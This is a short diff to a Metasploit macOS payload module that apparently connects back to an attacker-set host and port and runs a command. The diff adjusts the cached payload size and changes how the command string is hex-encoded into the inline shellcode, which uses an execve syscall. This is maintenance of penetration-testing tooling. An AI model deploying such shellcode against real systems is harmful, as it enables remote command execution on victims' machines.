@@ -4,7 +4,7 @@
 ##
 
 module MetasploitModule
-  CachedSize = 128
+  CachedSize = 127
 
   include Msf::Payload::Single
   include Msf::Payload::Osx
@@ -43,7 +43,7 @@ module MetasploitModule
       raise ArgumentError, 'LHOST must be in IPv4 format.'
     end
 
-    cmd = (datastore['CMD'] || '') + "\x00"
+    cmd = Rex::Text.to_hex_cstring(datastore['CMD'] || '')
     encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack1('N')
     encoded_host = Rex::Socket.addr_aton(lhost).unpack1('V')
     encoded_host_port = format('0x%<encoded_host>.8x%<encoded_port>.8x', { encoded_host: encoded_host, encoded_port: encoded_port })
@@ -80,7 +80,7 @@ module MetasploitModule
       xor rax,rax
       mov eax,0x200003b
       call load_cmd
-      db "#{cmd}", 0x00
+      db #{cmd}
     load_cmd:
       pop rdi
       xor rdx,rdx
